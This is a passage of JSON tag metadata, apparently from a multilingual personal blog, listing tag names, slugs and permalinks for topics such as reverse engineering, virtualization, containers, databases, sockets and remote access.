Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/en/tags/Reverse-Engineering/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://archer-baiyi.github.io/en/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://archer-baiyi.github.io/en/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"container","slug":"container","permalink":"https://archer-baiyi.github.io/en/tags/container/"},{"name":"Datenbank","slug":"Datenbank","permalink":"https://archer-baiyi.github.io/en/tags/Datenbank/"},{"name":"Database","slug":"Database","permalink":"https://archer-baiyi.github.io/en/tags/Database/"},{"name":"数据库","slug":"数据库","permalink":"https://archer-baiyi.github.io/en/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"socket","slug":"socket","permalink":"https://archer-baiyi.github.io/en/tags/socket/"},{"name":"remote","slug":"remote","permalink":"https://archer-baiyi.github.io/en/tags/remote/"}]}